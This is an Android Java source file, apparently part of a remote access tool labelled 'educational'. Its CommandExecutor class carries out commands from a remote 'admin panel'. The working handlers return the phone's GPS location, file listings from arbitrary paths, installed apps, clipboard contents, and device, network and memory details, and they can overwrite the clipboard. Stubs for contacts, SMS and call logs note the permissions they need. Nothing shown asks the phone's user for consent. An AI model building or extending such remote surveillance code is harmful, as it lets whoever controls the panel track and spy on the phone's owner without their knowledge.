package com.remoteaccess.educational.commands;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationManager;
import android.os.Build;
import android.os.Environment;
import androidx.core.app.ActivityCompat;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import java.io.File;
import java.util.ArrayList;
import java.util.List;

/**
 * Advanced Command Executor
 * Handles all remote commands sent from admin panel
 */
public class CommandExecutor {

    private Context context;

    public CommandExecutor(Context context) {
        this.context = context;
    }

    /**
     * Execute command and return result
     */
    public JSONObject executeCommand(String command, JSONObject params) {
        JSONObject result = new JSONObject();
        
        try {
            switch (command) {
                case "ping":
                    result = handlePing();
                    break;
                    
                case "get_device_info":
                    result = handleGetDeviceInfo();
                    break;
                    
                case "get_location":
                    result = handleGetLocation();
                    break;
                    
                case "list_files":
                    result = handleListFiles(params);
                    break;
                    
                case "get_installed_apps":
                    result = handleGetInstalledApps();
                    break;
                    
                case "get_contacts":
                    result = handleGetContacts();
                    break;
                    
                case "get_sms":
                    result = handleGetSMS(params);
                    break;
                    
                case "get_call_logs":
                    result = handleGetCallLogs(params);
                    break;
                    
                case "get_battery_info":
                    result = handleGetBatteryInfo();
                    break;
                    
                case "get_network_info":
                    result = handleGetNetworkInfo();
                    break;
                    
                case "vibrate":
                    result = handleVibrate(params);
                    break;
                    
                case "play_sound":
                    result = handlePlaySound(params);
                    break;
                    
                case "get_clipboard":
                    result = handleGetClipboard();
                    break;
                    
                case "set_clipboard":
                    result = handleSetClipboard(params);
                    break;
                    
                case "get_wifi_networks":
                    result = handleGetWifiNetworks();
                    break;
                    
                case "get_system_info":
                    result = handleGetSystemInfo();
                    break;
                    
                default:
                    result.put("success", false);
                    result.put("error", "Unknown command: " + command);
            }
            
        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ex) {
                ex.printStackTrace();
            }
        }
        
        return result;
    }

    private JSONObject handlePing() throws JSONException {
        JSONObject result = new JSONObject();
        result.put("success", true);
        result.put("message", "pong");
        result.put("timestamp", System.currentTimeMillis());
        return result;
    }

    private JSONObject handleGetDeviceInfo() throws JSONException {
        JSONObject result = new JSONObject();
        result.put("success", true);
        result.put("manufacturer", Build.MANUFACTURER);
        result.put("model", Build.MODEL);
        result.put("brand", Build.BRAND);
        result.put("device", Build.DEVICE);
        result.put("androidVersion", Build.VERSION.RELEASE);
        result.put("sdkVersion", Build.VERSION.SDK_INT);
        result.put("board", Build.BOARD);
        result.put("hardware", Build.HARDWARE);
        return result;
    }

    private JSONObject handleGetLocation() throws JSONException {
        JSONObject result = new JSONObject();
        
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) 
            != PackageManager.PERMISSION_GRANTED) {
            result.put("success", false);
            result.put("error", "Location permission not granted");
            return result;
        }

        LocationManager locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
        Location location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
        
        if (location == null) {
            location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
        }

        if (location != null) {
            result.put("success", true);
            result.put("latitude", location.getLatitude());
            result.put("longitude", location.getLongitude());
            result.put("accuracy", location.getAccuracy());
            result.put("altitude", location.getAltitude());
            result.put("speed", location.getSpeed());
            result.put("timestamp", location.getTime());
        } else {
            result.put("success", false);
            result.put("error", "Location not available");
        }
        
        return result;
    }

    private JSONObject handleListFiles(JSONObject params) throws JSONException {
        JSONObject result = new JSONObject();
        
        String path = params.optString("path", Environment.getExternalStorageDirectory().getPath());
        File directory = new File(path);
        
        if (!directory.exists() || !directory.isDirectory()) {
            result.put("success", false);
            result.put("error", "Invalid directory path");
            return result;
        }

        File[] files = directory.listFiles();
        JSONArray fileList = new JSONArray();
        
        if (files != null) {
            for (File file : files) {
                JSONObject fileInfo = new JSONObject();
                fileInfo.put("name", file.getName());
                fileInfo.put("path", file.getAbsolutePath());
                fileInfo.put("isDirectory", file.isDirectory());
                fileInfo.put("size", file.length());
                fileInfo.put("lastModified", file.lastModified());
                fileInfo.put("canRead", file.canRead());
                fileInfo.put("canWrite", file.canWrite());
                fileList.put(fileInfo);
            }
        }

        result.put("success", true);
        result.put("path", path);
        result.put("files", fileList);
        result.put("count", fileList.length());
        
        return result;
    }

    private JSONObject handleGetInstalledApps() throws JSONException {
        JSONObject result = new JSONObject();
        
        List<android.content.pm.ApplicationInfo> packages = 
            context.getPackageManager().getInstalledApplications(PackageManager.GET_META_DATA);
        
        JSONArray appList = new JSONArray();
        
        for (android.content.pm.ApplicationInfo packageInfo : packages) {
            JSONObject appInfo = new JSONObject();
            appInfo.put("packageName", packageInfo.packageName);
            appInfo.put("appName", packageInfo.loadLabel(context.getPackageManager()).toString());
            appInfo.put("isSystemApp", (packageInfo.flags & android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0);
            appList.put(appInfo);
        }

        result.put("success", true);
        result.put("apps", appList);
        result.put("count", appList.length());
        
        return result;
    }

    private JSONObject handleGetContacts() throws JSONException {
        JSONObject result = new JSONObject();
        result.put("success", false);
        result.put("error", "Contact access requires implementation with ContentResolver");
        // Implementation requires READ_CONTACTS permission and ContentResolver
        return result;
    }

    private JSONObject handleGetSMS(JSONObject params) throws JSONException {
        JSONObject result = new JSONObject();
        result.put("success", false);
        result.put("error", "SMS access requires implementation with ContentResolver");
        // Implementation requires READ_SMS permission and ContentResolver
        return result;
    }

    private JSONObject handleGetCallLogs(JSONObject params) throws JSONException {
        JSONObject result = new JSONObject();
        result.put("success", false);
        result.put("error", "Call log access requires implementation with ContentResolver");
        // Implementation requires READ_CALL_LOG permission and ContentResolver
        return result;
    }

    private JSONObject handleGetBatteryInfo() throws JSONException {
        JSONObject result = new JSONObject();
        
        android.content.IntentFilter ifilter = new android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED);
        android.content.Intent batteryStatus = context.registerReceiver(null, ifilter);
        
        if (batteryStatus != null) {
            int level = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
            int scale = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
            float batteryPct = level * 100 / (float) scale;
            
            int status = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1);
            boolean isCharging = status == android.os.BatteryManager.BATTERY_STATUS_CHARGING ||
                                status == android.os.BatteryManager.BATTERY_STATUS_FULL;
            
            int plugged = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_PLUGGED, -1);
            boolean usbCharge = plugged == android.os.BatteryManager.BATTERY_PLUGGED_USB;
            boolean acCharge = plugged == android.os.BatteryManager.BATTERY_PLUGGED_AC;
            
            result.put("success", true);
            result.put("level", batteryPct);
            result.put("isCharging", isCharging);
            result.put("usbCharge", usbCharge);
            result.put("acCharge", acCharge);
            result.put("temperature", batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_TEMPERATURE, 0) / 10.0);
            result.put("voltage", batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_VOLTAGE, 0));
        } else {
            result.put("success", false);
            result.put("error", "Battery info not available");
        }
        
        return result;
    }

    private JSONObject handleGetNetworkInfo() throws JSONException {
        JSONObject result = new JSONObject();
        
        android.net.ConnectivityManager cm = (android.net.ConnectivityManager) 
            context.getSystemService(Context.CONNECTIVITY_SERVICE);
        
        if (cm != null) {
            android.net.NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
            
            if (activeNetwork != null) {
                result.put("success", true);
                result.put("isConnected", activeNetwork.isConnected());
                result.put("type", activeNetwork.getTypeName());
                result.put("subtype", activeNetwork.getSubtypeName());
                result.put("isRoaming", activeNetwork.isRoaming());
            } else {
                result.put("success", false);
                result.put("error", "No active network");
            }
        } else {
            result.put("success", false);
            result.put("error", "ConnectivityManager not available");
        }
        
        return result;
    }

    private JSONObject handleVibrate(JSONObject params) throws JSONException {
        JSONObject result = new JSONObject();
        
        long duration = params.optLong("duration", 500);
        
        android.os.Vibrator vibrator = (android.os.Vibrator) context.getSystemService(Context.VIBRATOR_SERVICE);
        
        if (vibrator != null && vibrator.hasVibrator()) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                vibrator.vibrate(android.os.VibrationEffect.createOneShot(duration, 
                    android.os.VibrationEffect.DEFAULT_AMPLITUDE));
            } else {
                vibrator.vibrate(duration);
            }
            result.put("success", true);
            result.put("message", "Device vibrated for " + duration + "ms");
        } else {
            result.put("success", false);
            result.put("error", "Vibrator not available");
        }
        
        return result;
    }

    private JSONObject handlePlaySound(JSONObject params) throws JSONException {
        JSONObject result = new JSONObject();
        
        android.media.ToneGenerator toneGen = new android.media.ToneGenerator(
            android.media.AudioManager.STREAM_MUSIC, 100);
        toneGen.startTone(android.media.ToneGenerator.TONE_CDMA_ALERT_CALL_GUARD, 200);
        
        result.put("success", true);
        result.put("message", "Sound played");
        
        return result;
    }

    private JSONObject handleGetClipboard() throws JSONException {
        JSONObject result = new JSONObject();
        
        android.content.ClipboardManager clipboard = (android.content.ClipboardManager) 
            context.getSystemService(Context.CLIPBOARD_SERVICE);
        
        if (clipboard != null && clipboard.hasPrimaryClip()) {
            android.content.ClipData clipData = clipboard.getPrimaryClip();
            if (clipData != null && clipData.getItemCount() > 0) {
                CharSequence text = clipData.getItemAt(0).getText();
                result.put("success", true);
                result.put("text", text != null ? text.toString() : "");
            } else {
                result.put("success", false);
                result.put("error", "Clipboard is empty");
            }
        } else {
            result.put("success", false);
            result.put("error", "Clipboard not available");
        }
        
        return result;
    }

    private JSONObject handleSetClipboard(JSONObject params) throws JSONException {
        JSONObject result = new JSONObject();
        
        String text = params.optString("text", "");
        
        android.content.ClipboardManager clipboard = (android.content.ClipboardManager) 
            context.getSystemService(Context.CLIPBOARD_SERVICE);
        
        if (clipboard != null) {
            android.content.ClipData clip = android.content.ClipData.newPlainText("remote_text", text);
            clipboard.setPrimaryClip(clip);
            result.put("success", true);
            result.put("message", "Clipboard updated");
        } else {
            result.put("success", false);
            result.put("error", "Clipboard not available");
        }
        
        return result;
    }

    private JSONObject handleGetWifiNetworks() throws JSONException {
        JSONObject result = new JSONObject();
        result.put("success", false);
        result.put("error", "WiFi scanning requires ACCESS_WIFI_STATE and CHANGE_WIFI_STATE permissions");
        // Implementation requires WiFi permissions and WifiManager
        return result;
    }

    private JSONObject handleGetSystemInfo() throws JSONException {
        JSONObject result = new JSONObject();
        
        android.app.ActivityManager activityManager = (android.app.ActivityManager) 
            context.getSystemService(Context.ACTIVITY_SERVICE);
        
        if (activityManager != null) {
            android.app.ActivityManager.MemoryInfo memoryInfo = new android.app.ActivityManager.MemoryInfo();
            activityManager.getMemoryInfo(memoryInfo);
            
            result.put("success", true);
            result.put("totalMemory", memoryInfo.totalMem);
            result.put("availableMemory", memoryInfo.availMem);
            result.put("lowMemory", memoryInfo.lowMemory);
            result.put("threshold", memoryInfo.threshold);
            
            // Storage info
            android.os.StatFs stat = new android.os.StatFs(Environment.getDataDirectory().getPath());
            long bytesAvailable = stat.getBlockSizeLong() * stat.getAvailableBlocksLong();
            long bytesTotal = stat.getBlockSizeLong() * stat.getBlockCountLong();
            
            result.put("storageAvailable", bytesAvailable);
            result.put("storageTotal", bytesTotal);
        } else {
            result.put("success", false);
            result.put("error", "System info not available");
        }
        
        return result;
    }
}
